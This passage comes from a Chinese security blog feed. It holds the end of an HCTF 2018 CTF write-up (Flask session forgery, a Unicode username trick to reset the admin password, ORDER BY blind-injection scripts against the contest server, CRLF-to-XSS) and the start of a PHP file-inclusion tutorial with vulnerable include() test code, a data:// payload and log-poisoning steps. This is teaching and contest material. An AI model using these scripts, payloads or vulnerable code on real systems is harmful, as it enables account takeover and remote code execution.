extract_path +&#39;/*&#39;)     file = read_obj.read()     read_obj.close()     os.system(&#39;rm -rf &#39; + extract_path) except Exception as e:    file = None     os.remove(file_save_path)     if (file !=None):         if (file.find(base64.b64decode(&#39;aGN0Zg==&#39;).decode(&#39;utf-8&#39;)) != -1):            return redirect(url_for(&#39;index&#39;, error =1))             return Response(file) if __name__ ==&#39;__main__&#39;: #app.run(debug = True) app.run(host = &#39;127.0.0.1&#39;, debug =True, port = 10008)</code></pre><p>重点看这部分代码</p><pre><code class="hljs">@ app.route(&#39;/&#39;, methods = [&#39;GET&#39;]) def index():        error = request.args.get(&#39;error&#39;, &#39;&#39;)         if (error ==&#39;1&#39;):             session.pop(&#39;username&#39;, None)             return render_template(&#39;index.html&#39;,forbidden = 1)         if &#39;username&#39; in session:             return render_template(&#39;index.html&#39;, user =session[&#39;username&#39;], flag =flag.flag)        else :            return render_template(&#39;index.html&#39;)</code></pre><p>flag 渲染在 index.html 中，我们先看一下 &#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;templates&#x2F;index.html</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20hide_and_seek2.png" alt="此处输入图片的描述"></p><p>也就是要我们是 admin ,也就是伪造 session[‘username’]，但是 session 是经过 secret_key 加密的</p><blockquote><p>Flask中有个配置属性叫做SECRET_KEY</p><p>其作用是：</p><p>Flask（以及相关的扩展extension）需要进行加密</p><p>所以需要这个密钥SECRET_KEY</p><p>－》之所以需要加密，是因为有些涉及到安全的东西，需要加密</p><p>－》这些东西包括：</p><p>Flask本身相关的有：</p><p>session 其它一些第三方的库相关的有：</p><p>Flask-Images（内部可能是图片处理用到的） Cookies相关的 Flask-WTF的CSRF保护</p></blockquote><p>那么我们再观察一下代码，发现</p><pre><code class="hljs">app.run(host = &#39;127.0.0.1&#39;, debug =True, port = 10008)</code></pre><p>debug &#x3D; True ,记的有一个漏洞是在 debug 模式开启的情况下，预测 PIN 码，配合任意文件读取实现任意代码执行，当然这里好像行不通，我们还是看一下随机数</p><p>uuid.getnode() 这部分内容就是机器的MAC 地址转化成10进制后的结果，我们读 &#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address 得到</p><pre><code class="hljs">12:34:3e:14:7c:62 =====&gt; 20015589129314</code></pre><p>random.seed()  这个函数只要设置的是相同的种子得到的就是相同的随机数，那这个随机数我们就能预测了 </p><p>预测成功以后，我们就可以伪造 session 了，可能有人问为什么 session 可以伪造呢？这里我引用 <a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">p 牛的一句话</a></p><blockquote><p>并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。</p></blockquote><p>我们知道 PHP 有 PHPSESSID ,有服务器端存储 session 的机制，但是其他语言不一定有啊。你见过 flasksessionid 吗？没有吧，因为这种框架没有这样的特性（除非你使用 redis 来配合实现服务端存储），他们依然选择将 session 存储在客户端，但是为了方式 session 客户端任意的伪造，flask 设置了一个 secrey_key 对其进行了加密以及通过 hmac 算法对数据进行签名，但是并没有方式能防止用户的读取，于是我们先读取一下我们的 cookie </p><pre><code class="hljs">eyJ1c2VybmFtZSI6IkswcnozbiJ9.DsmGng.s7AI7WstLjsRLmkj2XnPU9T_zt4</code></pre><p>根据 flask session 的构造原理</p><pre><code class="hljs">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code></pre><p>我们发现实际上最前面的一部分如果没有因为长度过长经过 zlib 加压缩的话，我们就可以直接尝试使用 Base64 直接查看我们的结果，如下</p><pre><code class="hljs">&#123;&quot;username&quot;:&quot;K0rz3n&quot;&#125;</code></pre><p>或者在 p 牛的博客中给了一个脚本能解密这一部分内容</p><p><strong>示例代码：</strong></p><pre><code class="hljs">#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)        # 分离hmac签名     payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)  # 分离时间戳和 json    decompress = False                            # 判断是否经过了 zlib 的压缩    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p>到现在实际上我们就能使用一个 github 上面的伪造 flask_session 的工具进行伪造了</p><p><strong>下面附上工具</strong></p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>伪造一下 admin 登录</p><pre><code class="hljs">$ pythonPython 2.7.15 (v2.7.15:ca079a3ea3, Apr 30 2018, 16:30:26) [MSC v.1500 64 bit (AMD64)] on win32Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&gt;&gt;&gt; import random&gt;&gt;&gt; random.seed(20015589129314)&gt;&gt;&gt; random.random()0.11935137566861131&gt;&gt;&gt; str(random.random()*100)&#39;11.9351375669&#39;root@K0rz3n:~# python session_cookie_manager.py encode -s &#39;11.9351375669&#39; -t &#39;&#123;&quot;username&quot;:&quot;admin&quot;&#125;&#39;eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.W-1S6Q.QlWfL5jyrKC_9sKMlA6PWE5-HCg</code></pre><p>getflag</p><h2 id="0X04-admin"><a href="#0X04-admin" class="headerlink" title="0X04 admin"></a><strong>0X04 admin</strong></h2><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20admin1.png" alt="此处输入图片的描述"></p><p>题目有登录和注册的逻辑，并且在注释中提示了 </p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20admin2.png" alt="此处输入图片的描述"></p><p>题目给了源码</p><p><a href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a></p><p>这里面在 routes.py 里面有一个值得注意的地方，在 Login 的时候 Name 被 strlower 了一次，给了 session[‘name’]</p><pre><code class="hljs">@app.route(&#39;/login&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])def login():    if current_user.is_authenticated:        return redirect(url_for(&#39;index&#39;))    form = LoginForm()    if request.method == &#39;POST&#39;:        name = strlower(form.username.data)                             # name lower()        session[&#39;name&#39;] = name                                          # 存入 session        user = User.query.filter_by(username=name).first()        if user is None or not user.check_password(form.password.data):            flash(&#39;Invalid username or password&#39;)            return redirect(url_for(&#39;login&#39;))        login_user(user, remember=form.remember_me.data)        return redirect(url_for(&#39;index&#39;))    return render_template(&#39;login.html&#39;, title = &#39;login&#39;, form = form)</code></pre><p>然后在 change password 的逻辑中又 strlower 了一次</p><pre><code class="hljs">@app.route(&#39;/change&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&#39;login&#39;))    form = NewpasswordForm()    if request.method == &#39;POST&#39;:        name = strlower(session[&#39;name&#39;])                      # 登陆以后第二次 Lower()        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&#39;change successful&#39;)        return redirect(url_for(&#39;index&#39;))    return render_template(&#39;change.html&#39;, title = &#39;change&#39;, form = form)</code></pre><p>我们要以 admin 的身份登录进去，也就是我们要重置 admin 的密码，这种情况我们唯一的解决办法就是构造一个字符串，然后让其在两次 strlower() 后变成 admin，(赛后看 wp 还有一种思路就是我们可以利用 flask 的 客户端 session 机制来伪造 session 为 admin 成功登录)</p><p>但是直接在命令行执行 strlower() 说没有这个函数，后来发现这个函数是作者自己定义的一个，定义如下：</p><pre><code class="hljs">def strlower(username):    username = nodeprep.prepare(username)    return username    </code></pre><p>strlower() 底层调用了一个 nodeprep.prepare() 函数，我查了一下这个函数的归属，发现属于 twisted ，那我们的重点就转向了这个函数了，后来找到了一篇文章 <a href="https://labs.spotify.com/2013/06/18/creative-usernames/">https://labs.spotify.com/2013/06/18/creative-usernames/</a></p><p>这里说明了 twisted 老版本的一个字符串解析漏洞，我看了一下 requirements.txt twisted 的版本还是 10.2.0 那就无疑了</p><p>根据上面这篇文章的攻击链</p><pre><code class="hljs">&gt;&gt;&gt; canonical_username(u&#39;\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30&#39;)u&#39;BIGBIRD&#39;&gt;&gt;&gt; canonical_username(canonical_username(u&#39;\u1d2e\u1d35\u1d33\u1d2e\u1d35\u1d3f\u1d30&#39;))u&#39;bigbird&#39;</code></pre><p>我们很容易想到我们自己的攻击链</p><p>我们注册的时候使用 unicode 字符注册，比如 ᴀdmin,然后经过一次 strlower() 编程 Admin ,然后我们修改密码，这时候又会进行一次 strlower() 这样我们就能重置 admin 的密码了</p><p>py2 中有一个非常好用的函数 unichr() 我们可以利用这个函数进行 fuzz</p><p><strong>附上我的 fuzz 脚本：</strong></p><pre><code class="hljs">from twisted.words.protocols.jabber.xmpp_stringprep import nodeprepdef fuzz(unicode):    return nodeprep.prepare(nodeprep.prepare(unicode))dic = &#123;&#125;for i in xrange(1,100000):    try:        if(fuzz(unichr(i)) == &#39;a&#39;):            dic[i] = unichr(i)    except:        passprint dic</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">&#123;65: u&#39;A&#39;, 7491: u&#39;\u1d43&#39;, 9424: u&#39;\u24d0&#39;, 97: u&#39;a&#39;, 170: u&#39;\xaa&#39;, 7468: u&#39;\u1d2c&#39;, 8336: u&#39;\u2090&#39;, 9398: u&#39;\u24b6&#39;, 65313: u&#39;\uff21&#39;, 65345: u&#39;\uff41&#39;&#125;</code></pre><p>这个脚本只是尝试一个字母的，可以看到还是有不少的选择，然后按照供给链进行就可以了</p><h2 id="0X05-GAME"><a href="#0X05-GAME" class="headerlink" title="0X05 GAME"></a><strong>0X05 GAME</strong></h2><p>一个登录框</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20game1.png" alt="此处输入图片的描述"></p><p>这里用 sql 约束攻击输入 admin 后面一大堆空格 密码 admin 能登陆进去</p><p>我们点击这几个小标题就能发现 order 参数</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20game2.png" alt="此处输入图片的描述"></p><p>我们尝试 order&#x3D;password ,其实意识就是根据 password 的密码进行排序，我找了一下 admin 的位置，显示为 1 admin  这就是我们攻击的目标</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20game3.png" alt="此处输入图片的描述"></p><p>我注册两个账号 K0rz3ng 密码为 g  注册 K0rz3nh 密码是 h</p><p>然后我们再 admin admin 登录进去看一下</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20game4.png" alt="此处输入图片的描述"></p><p>这就是最最经典的 order by 注入了，这里借用出题人的话：</p><blockquote><p>部分网站在一些排名列表处只做了sql注入防御，而没有控制order by<br>后面实际的内容。排行榜本身模拟的id，username，sex，score是正常开发者想使用的字段，但是攻击者可以使用password字段进行排序，通过不断构造数据不一样的账号通过排列顺序盲注出指定账号的数据。</p></blockquote><p>附上官方 wp 中的脚本</p><pre><code class="hljs">#encoding:utf-8import requestsimport stringimport base64import randomdef catch(num,str1):    a=0    b=97    while(a&lt;=b):        mid=(a+b)/2        tmp =hex(mid)[2:]        if len(tmp)==1:            tmp=&quot;0&quot;+tmp        str2=str1+&quot;%&quot;+tmp        print str2        usernew = &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 13))        url=&quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;        data = &#39;username=%s&amp;password=%s&amp;sex=1&amp;submit=submit&#39; %  (usernew,str2)        headers=&#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125;        #data=&#123;&quot;username&quot;:&quot;admin&#39;&amp;&amp;mid(password,%d,1)=&#39;%s&#39;#&quot; % (num,str),&quot;password&quot;:&quot;1&quot;&#125;         #strings=&quot;aaaaaaaa&#39; or mid(username,1,1)=&#39;a&#39; and &#39;1&quot;        #print url        #正常用法        r=requests.post(url,data=data,headers=headers)        #print r.content        #用于burp调试        #r=requests.get(url,headers=header,proxies=&#123;&quot;http&quot;:&quot;127.0.0.1:8080&quot;&#125;)        #print r.content        sss = requests.get(&#39;http://game.2018.hctf.io/web2/user.php?order=password&#39;,headers=&#123;&quot;Cookie&quot;:&quot;PHPSESSID=p9op1amllrobs6okqfkih2vr40&quot;&#125;).content        index1= sss.index(&#39;&lt;tr&gt;\n\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\t1\n\t\t\t\t\t\t&lt;/td&gt;\n\t\t\t\t\t\t&lt;td&gt;\n\t\t\t\t\t\t\tadmin&#39;)        print usernew        index2=sss.index(usernew)        print index1        print index2        if index1 &gt; index2:            b =  mid -1        else:            a = mid +1    tmp =hex(a-1)[2:]    if len(tmp)==1:        tmp=&quot;0&quot;+tmp    return &quot;%&quot;+tmp    #print &quot;##################################&quot;    # found=Falseif __name__ == &quot;__main__&quot;:    #payloads = list(string.ascii_lowercase)    #payloads.append(&quot;_;&quot;)    payloads=&#39;!&quot;#$%&amp;\&#39;()*+,-./:;&lt;=&gt;?@0123456789abcdefghijklmnopqrstuvwxyz[\\]^_`&#123;|&#125;~&#39;    #payloads = list(&#39;sysadmin:0123456789_abcdefghijklmnopqrstuvwxyz ,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;)    user=&#39;%44%53%41%38%26%26%21%40%23%24%25&#39;    for i in range(1,100):        user = user+catch(i,user)        print &quot;now user is &quot;+user    #catch(5,&quot;dsa8&lt;&quot;)</code></pre><p>还有一个 FlappyPig 师傅的脚本</p><pre><code class="hljs">import requestsimport hashlibimport threadingdef md5(str):    sha = hashlib.md5(str)    encrypts = sha.hexdigest()    return encryptsdef reg(username,password):    url = &#39;http://game.2018.hctf.io/web2/action.php?action=reg&#39;    data = &#123;        &quot;username&quot;:username,        &quot;password&quot;:password,        &quot;sex&quot;:&quot;1&quot;,        &quot;submit&quot;:&quot;submit&quot;    &#125;    headers = &#123;        &#39;Connection&#39;: &#39;close&#39;,    &#125;    r = requests.post(url=url,data=data,headers=headers)def fuzz(start,end):    for i in range(start,end):        password = &#39;dSa8&amp;&amp;!@#$%^&amp;d1nGy1aS3dja&#39;+chr(i)        username=md5(password)        content = username + &quot; &quot; + password +&quot; &quot;+ str(i) + &quot;\n&quot;        reg(username, password)        print content    print str(start)+&#39;~&#39;+str(end)+&quot;complete&quot;step=20for i in range(33,127,step):    t = threading.Thread(target=fuzz, args=(i, i+step))    t.start()</code></pre><h2 id="0X06-bottle"><a href="#0X06-bottle" class="headerlink" title="0X06 bottle"></a><strong>0X06 bottle</strong></h2><p>这道题虽然队友拿了一血，但我在比赛过程中没来得及看，赛后看大佬们的 wp 分析一下吧,看看能学到什么新的知识</p><p>这道题题目提示是 bottle ，我搜索了一下，这个其实也是一个 python 的框架，这已经是比赛里面的第三道  Python 了，杭电的师傅们对 Python 真的情有独钟啊~~~</p><p>然后我搜了一下 bottle 漏洞 ，第一条就是 <a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">p 牛的文章</a>，bottle Http 注入漏洞, p 牛还是强 ，博客简直可以说是 CTF 解题指南 ，orz</p><p>看了一下其实就是一个 CRLF 注入漏洞，基本的原理就是当 设置返回 header 的地方没有对常见的 CR LF（也就是回车和换行符）进行过滤，而 CRLF 在 http 头部算是一个控制语句，这样，如果页面有一些参数能够实现重定向比如题目中的 path 或者常见的 url ，服务端根据这个参数的值来设置 response header ，那么攻击者就可以插入自己想要插入的内容，从而控制 response header ，从而实现我们控制返回值的 目的。</p><p>我们往往会使用这种攻击方式来进行 xss ，这次的题目也不例外，但是这种情况下就要控制 location 的值，使之不发生跳转，有两种方式吧</p><p>(1)一种是使用空的 location ，这种情况不发生跳转<br>(2)另一种是在 firefox 中使用端口号 0 来使其不跳转（这种方式只在 firefox 中可用）</p><p>这次的题目也已经提示使用的是 firefox 这种 Bot ,于是我们就能直接利用这种方式，当然这里还有一些小的技巧，比如控制一些 X-XSS-Protection 为 0, Content-Type 为 text&#x2F;html 或者是 Content-Length 等，最后拿到 cookie 就能改 cookie 登录了。</p><h2 id="0X07-参考"><a href="#0X07-参考" class="headerlink" title="0X07 参考"></a><strong>0X07 参考</strong></h2><p><a href="http://l-team.org/archives/hcft2018.html">http://l-team.org/archives/hcft2018.html</a><br><a href="https://bysec.io/hctf/writeup.html">https://bysec.io/hctf/writeup.html</a><br><a href="https://xz.aliyun.com/t/3253">https://xz.aliyun.com/t/3253</a><br><a href="https://xz.aliyun.com/t/3245">https://xz.aliyun.com/t/3245</a><br><a href="https://xz.aliyun.com/t/3242">https://xz.aliyun.com/t/3242</a><br><a href="https://xz.aliyun.com/t/3255">https://xz.aliyun.com/t/3255</a><br><a href="https://labs.spotify.com/2013/06/18/creative-usernames/">https://labs.spotify.com/2013/06/18/creative-usernames/</a><br><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a><br><a href="https://www.anquanke.com/post/id/163975">https://www.anquanke.com/post/id/163975</a><br><a href="https://www.anquanke.com/post/id/163975">https://www.anquanke.com/post/id/163975</a><br><a href="https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html">https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一篇文章带你理解漏洞之 PHP 文件包含漏洞</title>
    <link href="/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <url>/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="0X01-前言"><a href="#0X01-前言" class="headerlink" title="0X01 前言"></a><strong>0X01 前言</strong></h2><p>其实有想法写一个系列总结各种漏洞的，但是苦于没有充足的时间，只能先写一部分，后期再统一拿出来进行总结，这部分就是 PHP 文件包含的一些小总结。</p><h2 id="0X02-最常见的两个函数的形象解释："><a href="#0X02-最常见的两个函数的形象解释：" class="headerlink" title="0X02 最常见的两个函数的形象解释："></a><strong>0X02 最常见的两个函数的形象解释：</strong></h2><p>我们知道文件包含最常见的是两个函数 include() require()（这里就不谈他们的亲戚 include_once() 和 require_once() 了）</p><p>在php 这个工厂里，include() 是一个比较松散的员工，平时没有活干的时候他就闲着，从来不想着自己看有什么活主动一点，于是只有当程序运行到 include() 的时候他才会执行，并且呢也因为他松散的天性，在出错的时候他也只是报一个警告，并不会让程序中断</p><p>但是，有另一名员工 require() 他能力和include() 差不多，但是他这个人就非常的有上进心，工作认真负责，他一看到程序运行就立刻包含，不会像include() 一样等别人催，并且 require() 还会在出错的时候非常认真地报错，并小心谨慎地阻止程序继续运行</p><h2 id="0X03-回顾allow-url-fopen-allow-url-include"><a href="#0X03-回顾allow-url-fopen-allow-url-include" class="headerlink" title="0X03 回顾allow_url_fopen &amp; allow_url_include"></a><strong>0X03 回顾allow_url_fopen &amp; allow_url_include</strong></h2><p>之前玩PHP文件包含的时候似乎没有怎么深入的试验过这两个选项的开启对PHP文件包含究竟有什么影响，网上的大多数的资料也都是含糊其辞，反正我是没找到比较统一的说法，可能我太菜了，于是我不想浪费时间，打算亲自试一试。</p><h3 id="1-PHP-文件有哪几种常见的函数？"><a href="#1-PHP-文件有哪几种常见的函数？" class="headerlink" title="1.PHP 文件有哪几种常见的函数？"></a><strong>1.PHP 文件有哪几种常见的函数？</strong></h3><p>include()&#x2F;include_once()<br>require()&#x2F;require_once()<br>file_get_contents()<br>readfile()</p><p>那么这两个选项的开启与否是对这几个函数的包含能力有什么影响呢？我们下面做一个测试。</p><h3 id="2-测试开始："><a href="#2-测试开始：" class="headerlink" title="2.测试开始："></a><strong>2.测试开始：</strong></h3><h4 id="一、include"><a href="#一、include" class="headerlink" title="一、include()"></a><strong>一、include()</strong></h4><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php $file = $_GET[&#39;filename&#39;];include($file);?&gt;</code></pre><p>1.allow_url_fopen &#x3D; Off | allow_url_include &#x3D; Off</p><p>(1)普通方式包含本地文件（正常）<br>(2)普通方式包含远程文件（不正常）<br>(3)伪协议方式包含文件（不正常）</p><p>2.allow_url_fopen &#x3D; Off | allow_url_include &#x3D; On </p><p>(1)普通方式包含本地文件(正常)<br>(2)普通方式包含远程文件(不正常)<br>(3)伪协议方式包含文件(正常)</p><p>3.allow_url_fopen &#x3D; On | allow_url_include &#x3D; Off</p><p>(1)普通方式包含本地文件(正常)<br>(2)普通方式包含远程文件(不正常)<br>(3)伪协议方式包含文件(不正常)</p><p>4.allow_url_fopen &#x3D; On | allow_url_include &#x3D; On</p><p>(1)普通方式包含本地文件(正常)<br>(2)普通方式包含远程文件(正常)<br>(3)伪协议方式包含文件(正常)</p><p><strong>结论：</strong></p><blockquote><p>对include()：</p><p>allow_url_include 的开启对能否使用<strong>伪协议 php:&#x2F;&#x2F;input data:&#x2F;&#x2F;<strong>的形式起着</strong>决定作用</strong>，其他伪协议似乎没有影响<br>allow_url_fopen单独开启没有实质作用，但是和 allow_url_include 结合就能实现远程包含</p></blockquote><h4 id="二、require"><a href="#二、require" class="headerlink" title="二、require()"></a><strong>二、require()</strong></h4><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php $file = $_GET[&#39;filename&#39;];require($file);?&gt;</code></pre><blockquote><p>经测试，require() 和 include() 是一样的结果</p></blockquote><h4 id="三、readfile"><a href="#三、readfile" class="headerlink" title="三、readfile()"></a><strong>三、readfile()</strong></h4><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php $file = $_GET[&#39;filename&#39;];echo  readfile($file);?&gt;</code></pre><p>1.allow_url_fopen &#x3D; Off | allow_url_include &#x3D; Off</p><p>(1)普通方式读取本地文件（正常–&gt;源码中出现）<br>(2)普通方式读取远程文件（不正常–&gt;报错）<br>(3)伪协议方式读取文件（不正常 –&gt;源码不出现）</p><p>2.allow_url_fopen &#x3D; Off | allow_url_include &#x3D; On </p><p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(不正常–&gt;报错)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p><p>3.allow_url_fopen &#x3D; On | allow_url_include &#x3D; Off</p><p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p><p>4.allow_url_fopen &#x3D; On | allow_url_include &#x3D; On</p><p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p><p><strong>结论：</strong></p><blockquote><p>对readfile()：</p><p>allow_url_include 对其没有任何影响<br>allow_url_fopen 能让其读取远程文件</p></blockquote><p>**注：**readfile 返回从文件中读入的字节数，所以页面中返回的应该是读取到的文件的字节数</p><h4 id="三、file-get-contents"><a href="#三、file-get-contents" class="headerlink" title="三、file_get_contents()"></a><strong>三、file_get_contents()</strong></h4><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?php $file = $_GET[&#39;filename&#39;];echo  file_get_contents($file);?&gt;</code></pre><p>1.allow_url_fopen &#x3D; Off | allow_url_include &#x3D; Off</p><p>(1)普通方式读取本地文件（正常–&gt;源码出现）<br>(2)普通方式读取远程文件（不正常–&gt;报错）<br>(3)伪协议方式读取文件（正常–&gt;源码出现）</p><p>2.allow_url_fopen &#x3D; Off | allow_url_include &#x3D; On </p><p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(不正常–&gt;报错)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p><p>3.allow_url_fopen &#x3D; On | allow_url_include &#x3D; Off</p><p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p><p>4.allow_url_fopen &#x3D; On | allow_url_include &#x3D; On</p><p>(1)普通方式读取本地文件(正常–&gt;源码出现)<br>(2)普通方式读取远程文件(正常–&gt;源码出现)<br>(3)伪协议方式读取文件(正常–&gt;源码出现)</p><p><strong>结论：</strong></p><blockquote><p>对 file_get_contents()</p><p>allow_url_include 对其没有任何影响<br>allow_url_fopen 能让其读取远程文件</p></blockquote><h2 id="0X04-文件包含的分类以及利用方式："><a href="#0X04-文件包含的分类以及利用方式：" class="headerlink" title="0X04 文件包含的分类以及利用方式："></a><strong>0X04 文件包含的分类以及利用方式：</strong></h2><h3 id="一、远程文件包含："><a href="#一、远程文件包含：" class="headerlink" title="一、远程文件包含："></a><strong>一、远程文件包含：</strong></h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1.基本概念"></a><strong>1.基本概念</strong></h4><p>远程文件包含一般需要 allow_url_fopen 和 allow_url_include 全部打开，其主要利用就是包含远程服务器上面的恶意代码，让其在目标主机上运行，这样我们就能得到一个假的webshell(这个shell 是基于服务器上本身存在的文件的)，有了这个假的shell 我们实际上就能进行操作了，<strong>但是如果你有强迫症</strong>，非要一个自己写的完整的 shell 放在服务器上，我们可以有两种方法:</p><p><strong>(1)方法一：</strong></p><p>我们包含的文件并不是一句话，而是使用 </p><pre><code class="hljs">file_put_contents(&quot;路径&quot;,&quot;内容&quot;)；</code></pre><p>向 web 目录（一般网站的web 目录都是可写的）写入一个 真shell，然后我们去连，这也是在我们遇到文件飞快删除的一个解决方法（条件竞争中或者是AWD中经常用）</p><p><strong>(2)方法二：</strong></p><p>利用这个假shell 的小马，上传另一个小马（我觉得没有必要），或者上传一个大马上去</p><h4 id="2-常见利用"><a href="#2-常见利用" class="headerlink" title="2.常见利用"></a><strong>2.常见利用</strong></h4><p>既然是包含远程文件，那我们是不是要用到协议，除了常见的 http:&#x2F;&#x2F; https:&#x2F;&#x2F;  php 还给我们提供了常见的可以用来包含的协议，比如说 ftp:&#x2F;&#x2F; data:&#x2F;&#x2F; </p><p>我就用 data 给大家演示一下</p><p><strong>data:&#x2F;&#x2F;</strong></p><p>其实不仅仅是 PHP 连浏览器都支持 data: 协议</p><p><strong>格式：</strong></p><pre><code class="hljs">data:资源类型;编码,内容</code></pre><p>简单来说，要生成一个html资源，可以这样：</p><pre><code class="hljs">data:text/html;ascii,&lt;html&gt;&lt;title&gt;hello&lt;/title&gt;&lt;body&gt;world&lt;/body&gt;&lt;/html&gt;</code></pre><p>这里我直接给出 payload:</p><pre><code class="hljs">data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==</code></pre><p>其中 base64 部分就是 <code>&lt;?php phpinfo();</code></p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20data.png" alt="此处输入图片的描述"></p><h3 id="二、本地文件包含："><a href="#二、本地文件包含：" class="headerlink" title="二、本地文件包含："></a><strong>二、本地文件包含：</strong></h3><p>本地文件包含是在远程文件包含不能使用的情况下的选择，我们包含的对象主要是敏感文件，以及我们可控内容的文件,以下是常见的可以包含的文件：</p><h4 id="1-日志"><a href="#1-日志" class="headerlink" title="1.日志"></a><strong>1.日志</strong></h4><p>日志文件污染是通过将注入目标系统的代码写入到日志文件中。通常，访问目标系统上的某些对外开放的服务时，系统会自动将访问记录写入到日志文件中，利用这个机制，有可能会将代码写入到日志中。例如，利用一个包含PHP反弹shell的URL访问目标系统时，目标系统会返回一个404页面，并将创建一个apache的访问记录，记录中会包含之前的PHP反弹shell。利用之前已经发现的文件包含漏洞，可以解析apache的日志文件，从而执行日志中的PHP反弹shell。</p><p>日志文件的位置的确定就要前期的信息收集，一方面确定默认的日志的位置，另一方面可以利用这个包含漏洞包含一些配置文件寻找日志的位置</p><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?phpif(array_key_exists(&quot;rf&quot;, $_GET))&#123;$page = $_GET[&#39;rf&#39;];if($page != &#39;&#39;)&#123;include($page);&#125;&#125;else&#123;echo &#39;&lt;script&gt;window.location.href = &quot;./incfile.php?rf=&quot;&lt;/script&gt;&#39;;&#125;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;/head&gt; &lt;body&gt;&lt;center&gt;&lt;h2&gt;测试页： rf=include($input);&lt;/h2&gt;&lt;h3&gt;----测试完毕后请立即删除----&lt;/h3&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>首先我们截获数据包，在传入参数的地方输入</p><pre><code class="hljs">&lt;?php 